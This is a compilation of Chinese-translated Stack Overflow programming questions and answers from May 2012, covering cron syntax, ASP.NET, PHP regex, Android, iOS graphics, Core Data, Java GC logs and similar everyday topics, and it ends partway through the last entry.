我需要一个 cron 语句来运行几个小时，例如 1-8 然后 10-15。在这种情况下，以下语句将起作用，

```
0 1-8,10-15 * * * 
```

如果没有，任何人都可以帮助我吗？

提前致谢， Gnik

* * *

## 回答 #1

> 赞同：58
> 
> 时间：2012-05-30T06:51:08.247

你不能，你可以使用多个值或一个范围

`0 1,2,3,4,5,6,7,8,10,11,12,13,14,15 * * *`

[来源](https://web.archive.org/web/20161128152110/http://team.macnn.com/drafts/crontab_defs.html)：

> 时间标签用空格分隔。不要在标签中使用空格，这会混淆 cron。所有五个标签都必须存在。它们是彼此的逻辑与。最后一个时间标签和第一个命令之间还有一个空格。
> 
> 时间标签可以是通配符“*”，表示“全部”。它可以是一个值、多个值、一个范围或一个小数范围。

* * *

## 回答 #2

> 赞同：26
> 
> 时间：2015-02-20T10:56:51.223

我发现有两个 crontab 条目更具可读性：

```
0 1-8 * * * ...
0 10-15 * * * ... 
```

# asp.net - Master.page 无法正确加载

> ID：10811248
> 
> 赞同：0
> 
> 时间：2012-05-30T06:47:06.953
> 
> 标签：asp.net, master-pages, file-rename

昨天我试图重命名我的 *.aspx 、 *.cs、 *.designer.cs 文件和类。现在我遇到了在我网站的任何页面上正确加载 master.page 的问题（即使是我没有重命名的页面）。我不知道发生了什么我确定我在重命名时没有犯任何错误（使用重构）。每个页面都是白色的，但是当我按下 ctrl+F5 组合按钮时，相同的页面会正确显示。现在我用头撞墙；/

有人以前有过这样的事情吗？

我希望我描述这个问题可以理解。

感谢提前。

**编辑：**我已经让它工作了，只需点击 ctrl+shift+del 并从 firefox 浏览器中清除所有内容，它就开始工作了......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:37:10.380

如果一切正常，那是正常的，只是在 ctrl+f5 之后，您的浏览器似乎缓存了一些旧命名文件，并且无法将它们应用于新模板。

但是，如果不是，请尝试检查您会错过什么。1.检查aspx文件的代码文件属性是否匹配新名称；2\. 检查 aspx 文件的母版页文件属性是否与新母版页文件匹配。

打开 webbrowser 的开发工具（例如 firefox - firebug），并检查控制台是否有错误。这通常有助于确定错误原因。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:32:52.030

尝试在配置文件中添加母版页引用：

```
<pages masterPageFile="MySite.Master" /> 
```

# php - 从 PHP 中的字符串中删除 HTML 代码

> ID：10811255
> 
> 赞同：0
> 
> 时间：2012-05-30T06:47:36.643
> 
> 标签：php, string

我想`&quot; &euro; &aacute; ...`使用 REGEX 从字符串中删除所有 HTML 代码。

细绳：`"This is a string &quot; &euro; &aacute; &amp;"`

输出要求：`This is a string`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T06:59:11.487

你可以试试

```
$str="This is a string &quot; &euro; &aacute; &amp;";
$new_str = preg_replace("/&#?[a-z0-9]+;/i",'',$str);
echo $new_str; 
```

我希望这可能有用

**描述**：

```
& - starting with 
# - some HTML entities use the # sign 
?[a-z0-9] - followed by
;- ending with a semi-colon
i - case insensitive. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T06:55:26.100

```
$str = preg_replace_callback('/&[^; ]+;/', function($matches){
    return html_entity_decode($matches[0], ENT_QUOTES) == $matches[0] ? $matches[0] : '';
}, $str); 
```

这将起作用，但不会剥离`&euro;`，因为它不是 HTML 4 中的实体。如果您有 PHP 5.4，则可以使用标志`ENT_QUOTES | ENT_HTML5`使其与 HTML5 实体（如`&euro;`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T06:51:54.817

```
preg_replace('#&[^;]+;#', '', "This is a string &quot; &euro; &aacute; &amp;"); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-30T06:52:16.093

尝试这个：

```
preg_replace('/[^\w\d\s]*/', '', htmlspecialchars_decode($string)); 
```

虽然它可能会删除一些你不想删除的东西。您可能需要修改正则表达式。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-30T06:55:47.670

如果您尝试完全删除实体（即：不解码它们），请尝试以下操作：

```
$string = 'This is a string &quot; &euro; &aacute; &amp;';

$pattern = '/&([#0-9A-Za-z]+);/';
echo preg_replace($pattern, '', $string); 
```

# android - 向现有列表视图添加复选框

> ID：10811256
> 
> 赞同：-1
> 
> 时间：2012-05-30T06:47:38.637
> 
> 标签：android, listview, checkbox

我有一个列表视图。它工作正常。我想要的是为列表视图中的每一行添加一个复选框。那是我的代码：

```
public class List extends ListActivity{
@Override
public void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);

  BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
  if (!mBluetoothAdapter.isEnabled()) {
      mBluetoothAdapter.enable();
      while(true){
          if (mBluetoothAdapter.isEnabled()) {
              break;
          }
      }
      Toast.makeText(getApplicationContext(), "Bluetooth turned on", Toast.LENGTH_SHORT).show();
  }

  Set<BluetoothDevice> pairedDevices = mBluetoothAdapter.getBondedDevices();
  ArrayList<String> arrayOfBluetoothDevicesNames = new ArrayList<String>();
  for(BluetoothDevice bt : pairedDevices) {
      arrayOfBluetoothDevicesNames.add(bt.getName());
  }
  setListAdapter(new ArrayAdapter<String>(this, R.layout.list, arrayOfBluetoothDevicesNames));
  ListView listViewOfBluetooth = getListView(); 
```

有没有一种简单的方法可以通过更改我的代码来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T06:51:37.437

列表视图中的多项选择有很多解决方案。

[解决方案 1](https://stackoverflow.com/questions/1505751/android-binding-data-from-a-database-to-a-checkbox-in-a-listview)

[解决方案 2](http://appfulcrum.com/2010/09/12/listview-example-3-simple-multiple-selection-checkboxes/)

[解决方案 3](http://windrealm.org/tutorials/android/listview-with-checkboxes-without-listactivity.php)

# android - 应用内结算

> ID：10811258
> 
> 赞同：0
> 
> 时间：2012-05-30T06:48:00.953
> 
> 标签：android

我想将应用内计费功能与我的应用程序集成。我已阅读 android 开发者网站上的“实施应用内计费”主题。有一点“1.登录你的Google Play发行商账号”。Google Play 上是否有试用发布者帐户（免费）功能，如果有，创建该帐户的程序是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T06:55:17.963

您可以使用您的 Android 开发者帐户测试应用内结算。

由于android开发者网站

Google Play 发布商网站提供了多种工具，可帮助您在发布应用内结算实施之前对其进行测试。您可以使用这些工具来创建测试帐户并购买向您的应用程序发送静态计费响应的特殊保留项目。

要在应用程序中测试应用内计费，您必须在 Android 设备上安装该应用程序。您不能使用 Android 模拟器来测试应用内计费。您用于测试的设备必须运行标准版本的 Android 1.6 或更高版本的平台（API 级别 4 或更高版本），并安装最新版本的 Google Play 应用程序。如果设备未运行最新的 Google Play 应用程序，您的应用程序将无法向 Google Play 发送应用内结算请求。有关如何设置用于开发 Android 应用程序的设备的一般信息，请参阅使用硬件设备。

请阅读[文档](http://developer.android.com/guide/market/billing/billing_testing.html)以获取更多详细信息

# svn - 在哪里（地点）在 mac 中创建存储库？

> ID：10811259
> 
> 赞同：0
> 
> 时间：2012-05-30T06:48:01.930
> 
> 标签：svn, version-control

我在 Mac 上，我想在我的 HDD 中创建一个存储库。我还希望其他桌面 Windows PC 连接到我的存储库。

我将在哪里创建其他 PC 可以通过 IP（在本地网络内）访问它的存储库？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T08:56:06.053

以下是您需要执行的操作的大致大纲：

*   在您的 MAC 上创建一个新用户（例如*svnadmin*）。
*   `~svnadmin`在（例如`~svnadmin/repos`）下为您的存储库创建一个目录。
*   在with中创建一个新的存储库（例如`my_repo`）-[这里是如何](http://svnbook.red-bean.com/en/1.7/svn.reposadmin.create.html)。`repos``svnadmin create`
*   配置并启动 SVN 服务器 -[方法如下](http://svnbook.red-bean.com/en/1.7/svn.serverconfig.svnserve.html)。

上述所有步骤都应由`svnadmin`用户完成。

您现在可以使用`svn://<you-mac-ip>/my_repo`.

# javascript - 使用jquery从主窗口打开中心弹出窗口？

> ID：10811260
> 
> 赞同：1
> 
> 时间：2012-05-30T06:48:03.087
> 
> 标签：javascript, jquery, html, generics, popup

在 Web 应用程序中，我在不同的点打开了很多弹出窗口。这些是使用 window.open() 打开的普通弹出窗口，而不是 Jquery 弹出窗口。它们在浏览器窗口的不同位置打开，并且具有不同的高度和宽度。

现在，我想在浏览器上打开所有弹出窗口时居中。我编写了一个函数，它将返回顶部和左侧值，以便为传递的高度和宽度居中。现在，我需要在每次使用 window.open 打开弹出窗口之前调用一次此函数，获取顶部和左侧的值，然后将它们传递给 window.open。我最终可能会在各种 javascript 文件中的许多地方执行此操作。

有没有一种通用的方法来实现我的要求，只需更改使用 window.open 打开的所有弹出窗口的居中。Jquery 可以帮助我轻松做到这一点吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T06:55:12.583

我认为这与您目前拥有的类似，但您可能想看看。似乎没有太多需要使用 jQuery [链接](http://www.nigraphic.com/blog/java-script/how-open-new-window-popup-center-screen)

```
function PopupCenter(pageURL, title,w,h) {
var left = (screen.width/2)-(w/2);
var top = (screen.height/2)-(h/2);
var targetWin = window.open (pageURL, title, 'toolbar=no, location=no, directories=no,     status=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no, width='+w+', height='+h+', top='+top+', left='+left);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T06:55:32.367

只需将您的代码从

```
var params = getCenteredCoords();
window.open(url, "...", params+"..."); 
```

至

```
myPopup(url, "...", "..."); 
```

并声明一个全局

```
function myPopup(url, name, params) {
    var coords = getCenteredCoords();
    return window.open(ul, name, coords+params);
} 
```

是的，您将需要在每个文件中使用您的自定义解决方案。所以唯一的方法是不要重复自己并使用一个全局函数。

好的，有一种方法可以不更改所有文件中的所有内容：`window.open`用您的自定义解决方案覆盖：

```
window.open = (function(original){
    return function myPopup(url, name, params) {
        var coords = getCenteredCoords();
        return original(ul, name, coords+params);
    };
})(window.open); 
```

# java - 推断我的垃圾收集日志

> ID：10811261
> 
> 赞同：0
> 
> 时间：2012-05-30T06:48:09.993
> 
> 标签：java, logging, garbage-collection, jvm

你能解释一下这个日志吗？

```
142.678: [Full GC 142.678: [CMS142.764: [CMS-concurrent-mark: 0.088/0.088 secs] [Times: user=0.09 sys=0.00, real=0.09 secs] 
     (concurrent mode failure): 21888K->19536K(21888K), 0.2969878 secs] 31679K->23701K(31680K), [CMS Perm : 1489K->1489K(12288K)], 0.2972058 secs] [Times: user=0.30 sys=0.00, real=0.30 secs] 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:21:03.477

你`new generation`的填得太快了，在填满之前，并发收集`tenured generation`无法完成`new generation`。

尝试增加`new generation`.

更详细的解释，看[这里](https://stackoverflow.com/questions/3706570/why-cmsconcurrent-mode-failure-happened-here)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-31T07:42:56.457

First, you are using CMS garbage collector (find more about it at [Understanding pauses of CMS collector](http://blog.ragozin.info/2011/06/understanding-gc-pauses-in-jvm-hotspots_02.html)

**(concurrent mode failure)** means that background garbage collector cannot reclaim memory fast enough (young collection have failed to find some free space in tenured generation to promote objects) and JVM have switched to stop-the-world **FullGC**.

Possible reason for that - heap is too small - young generation is too small and a lot of young objects are leaking tenured space.

# google-analytics - Google Analytics 是否跟踪多个域的流量？

> ID：10811262
> 
> 赞同：0
> 
> 时间：2012-05-30T06:48:13.957
> 
> 标签：google-analytics

我有一个网站`subdomain.domain.com`。我为此创建了一个分析帐户并包含跟踪代码。后来我注册了一个新域`xyz.com`并指向同一个网站`subdomain.domain.com`。**在 Google 分析报告中，分析会显示来自两个域的流量，还是我需要进行一些更改？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2018-10-03T03:50:36.093

无论页面 URL 中指定什么主机名，Google Analytics 都会跟踪网站流量。您可以使用内容报告中的*主机名*维度进行查找。在您的情况下，根据主机名重定向的类型，您可能会或可能不会在报告中看到*xyz.com*。当您在浏览器中导航到 xyz.com 时，选择任何页面并可以在您的浏览器中看到 xyz.com - 它会被跟踪。如果您可以看到 subdomain.domain.com - 最后一个将被跟踪。

如果您的网站可通过*subdomain.domain.com*和*xyz.com*访问- 由于浏览器中的 GA cookie 是按主机名设置的，因此您可能会遇到跨域用户和重复（夸大）用户的问题

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T17:10:17.680

我有同样的情况，我们的 URL 已更改，我们现在处于交叉期，而两个 URL 都处于活动状态。

在不更改跟踪代码的情况下，我可以像以前一样获取我们的统计信息，**但**我无法在分析报告中告诉访问者使用哪个 URL 访问该站点。如果您不关心这一点，那么您无需更新您的跟踪代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-29T14:01:32.100

内容下有一个名为“主机名”的二级维度，这将根据是否访问过您的流量来划分您的流量`subdomain.domain.com`。`xyz.com`

# android - 更新 SQLite 数据库

> ID：10811269
> 
> 赞同：1
> 
> 时间：2012-05-30T06:48:49.060
> 
> 标签：android, android-layout, sqlite

当我的第一个活动加载时，数据库在 OnCreate() 中创建。然后在下一个活动中，当我从表中删除几行并再次返回第一个活动时，所有数据库都被创建，其中包含所有记录。我希望数据库向我显示更新的表记录，而不是再次执行创建和插入表...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:54:03.290

我认为在第一个活动中在数据库中创建/插入值之前，您不会检查它是否已经存在，因此每次输入第一个活动时，您的数据库都会重建。因此，在使用以下方法创建数据库之前检查数据库是否已经存在：

* * *

在 try 块中使用数据库路径打开您的数据库，例如：

```
try{
   SQLiteDatabase   dbe = SQLiteDatabase.openDatabase("/data/data/bangla.rana.fahim/databases/dictionary", null,0);
            Log.d("opendb","EXIST");
            dbe.close();
            } 
```

如果发生异常，则数据库不会退出，因此请创建它：

```
catch(SQLiteException e){
                Log.d("opendb","NOT EXIST");

            SQLiteDatabase db = openOrCreateDatabase("dictionary", MODE_PRIVATE, null);
                    db.execSQL("CREATE TABLE IF NOT EXISTS LIST(wlist varchar);");

                    db.execSQL("INSERT INTO LIST VALUES('খবর');");
                    db.execSQL("INSERT INTO LIST VALUES('কবর');"); //whatever you want
                 db.close();
} 
```

就是这样，你完成了:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T08:07:36.950

如果您计划首先创建数据库并逐步修改它，您可以使用`SharedPreferences`并且在您的资源中的某处您可以有一个代表您的应用程序版本的数字，这样只有当您增加这个数字时它才会被调用。

```
// In your onCreate function

SharedPreferences prefs = getSharedPreferences("myoptions", Context.MODE_PRIVATE);
int resourceVersion = //Gets the new version from the resources, for example XML
int applicationVersion = prefs.getInt("APPLICATION_VERSION", 0);
if(applicationVersion < resourceVersion ) {
  // Create or update your database here
  SharedPreferences.Editor editor = getSharedPreferences("myoptions", Context.MODE_PRIVATE).edit();
  editor.putInt("APPLICATION_VERSION", resourceVersion );
  editor.commit();
} 
```

# actionscript-3 - VerifyError：错误 #1014：找不到 JSON 类。

> ID：10811270
> 
> 赞同：0
> 
> 时间：2012-05-30T06:48:53.023
> 
> 标签：actionscript-3

嗨，我是 AS3 的初学者，遇到了这个特殊的错误：

```
VerifyError: Error #1014: Class JSON could not be found.

at Function/http://adobe.com/AS3/2006/builtin::apply()
at flash.external::ExternalInterface$/_callIn()
at Function/<anonymous>() 
```

我正在尝试原生 JSON，在 IDE (FlashDevelop) 上一切似乎都很好。我还在使用 Flash Player 11、Flex SDK 4.6.0 和 AIR 3.1，如[Adob​​e AS3 Native JSON上所述](http://help.adobe.com/en_US/FlashPlatform/beta/reference/actionscript/3/JSON.html#methodSummary)

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T11:00:00.377

请确保您的 Flash player 11.2 playerglobal.swc 位于：

> \frameworks\libs\player\11.X

其中 X 表示 Flash player 11 发行版 1、2、3。另请注意，您需要在编译常量中指定以下内容：

> -swf 版本=13 (FP11.1)
> 
> -swf 版本=15 (FP11.2)

一旦你这样做了，你应该能够让原生 JSON API 工作。

# c# - 如何存储 PathGeometry？

> ID：10811272
> 
> 赞同：0
> 
> 时间：2012-05-30T06:49:01.210
> 
> 标签：c#

我有几个 PathGeometry-s 显示地方之间的线。我想保存这些行。我无法将其序列化为 XML，也不知道如何存储这些行。有机会吗？

[编辑] 我在代码后面有 PathGeometry-s，而不是在 XAML 中。当我尝试使用 XMLWriter 类来存储这些时，它会给出异常“......类无法恢复，因为它们不被称为已知类型”

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-30T07:15:33.043

如果您已经将 PathGeometry 实例化为对象，您可以尝试使用 XAMLWriter 对其进行序列化[MSDN](http://msdn.microsoft.com/en-US/library/system.windows.markup.xamlwriter.aspx)

例如

```
 var pathgeo = new PathGeometry();
        pathgeo.AddGeometry(new PathGeometry(new PathFigureCollection() { new PathFigure(new Point(10, 50), new List<PathSegment>() { new LineSegment(new Point(200, 70), true) }, false) }));

        // Save
        var s = XamlWriter.Save(pathgeo);

        byte[] byteArray = Encoding.ASCII.GetBytes(s);
        var stream = new MemoryStream(byteArray);

        // Load
        var ob = XamlReader.Load(stream);

        // test beeing a System.Windows.Shapes.Path
        test.Data = ob as PathGeometry; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T07:37:06.400

您可以`PathGeomety`在集合中序列化 -s 字符串表示，当您想要恢复它时，使用这个很棒的解决方案来恢复

[http://stringtopathgeometry.codeplex.com](http://stringtopathgeometry.codeplex.com)

有返回 PathGeometry 的方法 StringToPathConvertor.Convert(string path)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-30T07:06:42.897

为什么不能将其存储到 xml？怎么样`<Line x1="0" y1="0" x2="100" y2="100"/>`？也许你可以举个小例子？

# asp.net-mvc - MVC3 混合表单和 Windows 身份验证

> ID：10811273
> 
> 赞同：3
> 
> 时间：2012-05-30T06:49:01.577
> 
> 标签：asp.net-mvc, asp.net-mvc-3, authentication, forms-authentication

我目前有一个可供外部客户访问的 Intranet 站点。因此，我使用表单身份验证进行了设置。然而，（我的老板）的权力希望我们所有的域用户不必输入他们的用户名和密码来访问该站点。

我做了一些或阅读，一切似乎都指向设置一个 WinLogin.aspx 页面，您将其更改为使用 WindowAuthenthication，然后从那里重定向。

我对此有疑问，因为我不喜欢在我的 mvc 应用程序中放置一个 aspx 表单的想法。

谁能告诉我如何在没有第二个应用程序的情况下使用严格的 MVC 控制器/动作设置来实现混合身份验证？

注意：在 IIS 7 机器上运行 MVC 3。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T06:57:27.370

表单身份验证与文件的 URL 或物理结构无关。重要的是 URL 最终应该映射到服务器上的物理（或虚拟）资源，并被处理并返回给用户。

因此，对于每个传入调用（每个 HTTP 请求，甚至是 CSS 和 JavaScript 文件的请求），您必须查看当前用户是否有足够的权限来访问它。如果不是，那么您可能会将他重定向到**登录**页面。

如果你愿意，你可以有一个 URL，比如`/user/windowslogin`where`user`是控制器的名称，并且`windowslogin`是你的操作方法的名称。然后您可以在您的操作上创建一个自定义身份验证属性（类似于`[WindowsAuthentication]`）`windowslogin`，并在该属性（本质上是一个 MVC 过滤器）中，您可以查看当前请求是否来自您的域，如果是，请与 Active 交谈用于身份验证或类似内容的目录，以及在身份验证成功的情况下，使用类创建身份验证 cookie `FormsAuthentication`，以及故事的其余部分。

但是，我认为这不是一件容易的事。其他人可能会引入更好的解决方案。

# ios - 为什么 CGImage 数据不能在往返中存活？

> ID：10811276
> 
> 赞同：1
> 
> 时间：2012-05-30T06:49:17.937
> 
> 标签：ios, core-graphics

我有一个手绘视图（用户可以用手指画线）。我只使用了几种颜色，所以我编写了一个压缩算法（想通过本地网络将其发送到另一台 iPad），但我似乎无法准确地从图形上下文中获取数据，即使使用这个简单的测试：

```
//Get the data
UIGraphicsBeginImageContextWithOptions(self.bounds.size, NO, 0.0f);
CGContextRef c = UIGraphicsGetCurrentContext();
[self.layer renderInContext:c];
baseImageView.image = UIGraphicsGetImageFromCurrentImageContext();
UIGraphicsEndImageContext();

CGImageRef imageRef = baseImageView.image.CGImage;
NSData *dataToUse = (NSData *)CGDataProviderCopyData(CGImageGetDataProvider(imageRef));

//Reuse the data
CGDataProviderRef provider = CGDataProviderCreateWithCFData((CFDataRef)dataToUse);
CGColorSpaceRef colorSpace = CGColorSpaceCreateDeviceRGB();
CGImageRef test = CGImageCreate(width,height,8,32,4*width,colorSpace,
kCGBitmapByteOrder32Big|kCGImageAlphaPremultipliedLast,provider,NULL,false,
kCGRenderingIntentDefault); //I get width and height from another part of the program

imageView.image = [UIImage imageWithCGImage:test]; 
```

我只是从一个 CGImage 中复制了数据并尝试将其插入到另一个中。但是，结果是垃圾，不仅如此，由于某种原因，当我复制数据时它会显示为 BGRA，但 CGImageCreate 需要 RGBA。这个往返测试我哪里出错了？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:43:18.980

看起来答案是仅仅获得数据提供者是不够的。您需要将图像实际渲染到位图上下文中并从那里获取数据。修改方式：

```
//Get the data
CGImageRef imageRef = baseImageView.image.CGImage;
size_t height = CGImageGetHeight(imageRef);
size_t width = CGImageGetWidth(imageRef);
size_t bufferLength = width * height * 4;
unsigned char *rawData = (unsigned char *)malloc(bufferLength);

CGColorSpaceRef colorSpace = CGColorSpaceCreateDeviceRGB();
CGContextRef context = CGBitmapContextCreate(bitmapData, width, height, 8,
4*width, colorSpace, kCGImageAlphaPremultipliedLast);
CGColorSpaceRelease(colorSpace);

CGContextDrawImage(context, CGRectMake(0, 0, width, height), imageRef);
CGContextRelease(context);

NSData *dataToUse = [NSData dataWithBytes:rawData length:bufferLength];

//Later free(rawData); 
```

使用数据还是一样的。

# facebook - 提交 Open Graph Read 操作

> ID：10811278
> 
> 赞同：0
> 
> 时间：2012-05-30T06:49:23.333
> 
> 标签：facebook, facebook-graph-api, facebook-opengraph

每次我提交时，Facebook 都会拒绝我的阅读操作。请注意，我的开放图形应用程序功能包括删除 facebook 要求的文章。

你可以访问我的网站 www.heyngine.com

请指教

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T08:41:05.780

如果您`Read`在网站上使用该操作，则必须使用内置`read`操作 ( `news.reads`)，而不是为同一事物创建自己的操作。如果您的操作与内置操作重复，Facebook 将拒绝您的操作。

其次，当您通过您的网站登录 Facebook 时，它不会请求`publish_action`许可。这是向 Facebook 发布操作所必需的。没有这个，您的`read`操作将不会发布到用户的个人资料中。另外，当我没有通过 Facebook 登录您的网站时，为什么会显示“社交开/关”和“删除”按钮？

Facebook 文档/政策规定，用户必须有单独的“登录”体验才能注销用户。即 Facebook 用户只有在通过 Facebook 连接到您的网站后才能看到“社交开/关”和“删除”，而不是像您目前所做的那样。

# ios - 如何从 url 获取 objectID？

> ID：10811280
> 
> 赞同：5
> 
> 时间：2012-05-30T06:49:38.620
> 
> 标签：ios, core-data, object-identity

我的代码如下：

```
NSURL *urlID = [objID URIRepresentation];
    NSString *strID = [urlID absoluteString];
    NSDictionary *infoDict = [NSDictionary dictionaryWithObjectsAndKeys:strID, @"objectID", nil];
    localNotification.userInfo = infoDict; 
```

然后我想得到这样的反对：

```
NSString *strID = [notification.userInfo objectForKey:@"objectID"];
NSURL *urlID = [[NSURL alloc] initWithString:strID];
NSManagedObjectID *objID = [[NSPersistentStoreCoordinator alloc] managedObjectIDForURIRepresentation:urlID]; 
```

但 objID 为零。哪里不对了 ？怎么做 ？谢谢你 ！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-20T14:59:31.110

如果这是您的实际代码，那么下面的行是可疑的

```
NSManagedObjectID *objID = [[NSPersistentStoreCoordinator alloc] managedObjectIDForURIRepresentation:urlID]; 
```

您正在分配一个新的 NSPersistentStoreCoordinator，未初始化，没有添加任何存储。根据文档，如果没有找到匹配的商店，它将返回 nil。

如果您有方便的托管对象上下文，那么以下应该可以工作

```
NSManagedObjectID *objId = [[[self managedObjectContext] persistentStoreCoordinator] managedObjectIDForURIRepresentation:urlID]; 
```

否则我会同意 svena 的答复。

# c++ - 用户提供的多余数据会怎样？

> ID：10811281
> 
> 赞同：2
> 
> 时间：2012-05-30T06:49:40.200
> 
> 标签：c++, memory, memory-management

在 C++ 中，如果输入过多，会发生什么情况？它是存储在某个地方还是被完全忽略？

例如，这个示例代码：

```
#include <iostream>
using namespace std;
int main()
{
   char a, b, c;

   cout << "Enter three letters: ";

   cin.get(a).get(b).get(c);

   cout << "a: " << a << "\nb: " << b << "\nc: " << c << endl;
 return 0;
} 
```

它只要求三个字母，让我想输入多少就输入多少。其余的都去哪儿了？最好是无处……对吧？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-30T06:51:11.837

它们进入输入缓冲区。当您的进程退出（不读取它们）时，缓冲区将被丢弃（以及未读的内容）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-30T07:39:52.553

这取决于。有几个缓冲区在起作用。 *通常*（没有保证，但对于 Unix 和 Windows 肯定是这样），您必须在程序看到任何数据之前按 Enter 键；您输入的所有内容（包括 enter 在内）都会进入进程中的缓冲区，然后在进程终止时将其丢弃。

这是默认行为，假设您的进程是从 shell 的命令行启动的，并且标准输入连接到键盘。如果另一个进程启动了您的进程，它可能已经重新配置输入以表现不同；很可能配置键盘（至少在 Unix 下）以在输入每个字符时发送每个字符，在这种情况下，在您读取键盘后的下一个读取键盘的过程将获得额外的字符。

最后，如果标准输入来自文件，那么文件中的数据当然会保持原样，正如您所期望的那样。如果它来自管道，至少在 Unix 上，数据将被丢弃，任何仍在写入管道的进程都会收到信号。

# android - Android LocationManager.PASSIVE_PROVIDER 是否提供精确的位置？

> ID：10811283
> 
> 赞同：0
> 
> 时间：2012-05-30T06:49:46.347
> 
> 标签：android, geolocation

我正在尝试通过 3rd 方应用程序接收后台位置更新

```
mLocationManager.requestLocationUpdates(LocationManager.PASSIVE_PROVIDER, MIN_TIME_SHORT, MIN_DISTANCE, mLocationListener); 
```

但事实证明，PASSIVE_PROVIDER 只提供来自 NETWORK_PROVIDER 的位置更新。有没有办法也从 GPS_PROVIDER 接收更新，或者它不受支持？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-30T06:52:02.133

PASSIVE_PROVIDER 表示如果其他应用程序触发位置搜索，我们的应用程序也会给出位置信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T09:40:41.353

```
 Is there a way to also receive updates from GPS_PROVIDER or it is not supported? 
```

要从 GPS_Provider 获取位置，您必须使用以下代码段：

```
lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000L, 500.0f, this); 
```

lm 是你的`LocationManager`。不要忘记设置使用权限

PS：您可以同时使用 Network_Provider 和 GPS_Provider

# iphone - UIView 动画异常

> ID：10811286
> 
> 赞同：0
> 
> 时间：2012-05-30T06:50:19.690
> 
> 标签：iphone, ios, core-animation, uigesturerecognizer

我目前正在尝试使用滑动手势从一个视图动画到另一个视图，这反过来将动画视图 A 从屏幕上移到左侧，然后让视图 B 从右侧出现动画。

这实际上在我的应用程序中有效，但是当视图动画而不是视图 B 跟随视图 A 的边缘并让它们同时移动时，视图 B 将不会移动，直到视图 A 的动画完成...

这就是代码的样子

```
- (void)swipedScreen:(UISwipeGestureRecognizer*)gesture
{
    if (gesture.direction = UISwipeGestureRecognizerDirectionLeft) {
        [UIView animateWithDuration:1.50 animations:^{

//            [self.detailViewB.view setAlpha:1.0f];
            [self.detailViewB.view setCenter:CGPointMake(CGRectGetMidX(self.view.frame), CGRectGetMidY(self.view.frame))];
            [self.detailViewA.view setCenter:CGPointMake(-640, CGRectGetMidY(self.view.frame))]; 
        }];
    }
} 
```

如果你想自己编译源代码，这里是我正在搞乱的代码的链接。 [http://dl.dropbox.com/u/53813770/SMPrototypeB.zip](http://dl.dropbox.com/u/53813770/SMPrototypeB.zip)

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T06:59:07.637

修复了您的代码并在[此处重新上传了项目](http://cl.ly/Gzaa)

我所做的更改：

```
-(void) viewDidLoad
{
    [self.detailViewB.view setFrame:CGRectMake(320, 0, self.view.frame.size.width, self.view.frame.size.height)];

}

- (void)swipedScreen:(UISwipeGestureRecognizer*)gesture
{
    if (gesture.direction = UISwipeGestureRecognizerDirectionLeft) {
        [UIView animateWithDuration:1.50 animations:^{

            //            [self.detailViewB.view setAlpha:1.0f];
            [self.detailViewB.view setFrame:CGRectMake(0, 0, self.view.frame.size.width, self.view.frame.size.height)];
            [self.detailViewA.view setFrame:CGRectMake(-320, 0, self.view.frame.size.width, self.view.frame.size.height)];
        }];
    } 
```

# java - 匿名类与实现接口的编程约定

> ID：10811289
> 
> 赞同：7
> 
> 时间：2012-05-30T06:50:37.313
> 
> 标签：java, android, interface, anonymous-class

**从 android 开发的角​​度来看**，当您编程时，您更喜欢为监听器实现哪种方式？或者您认为哪种方式最适合可读代码？我举了两个关于这些事情的例子，但考虑更复杂的类，比如有多个 Listener 的类：)

第一个例子是匿名类：

```
public class SenderReceiverActivity extends Activity {

Button cancelButton;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.sending);
    cancelButton = (Button) findViewById(R.id.button1);
    cancelButton.setOnClickListener(new OnClickListener() {

        public void onClick(View v) {

        }
    });
}} 
```

第二个实现接口的例子：

```
public class SenderReceiverActivity extends Activity implements OnClickListener {

Button cancelButton;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.sending);
    cancelButton = (Button) findViewById(R.id.button1);
    cancelButton.setOnClickListener(this);
}

public void onClick(View v) {

}
} 
```

* * *

## 回答 #1

> 赞同：4
> 
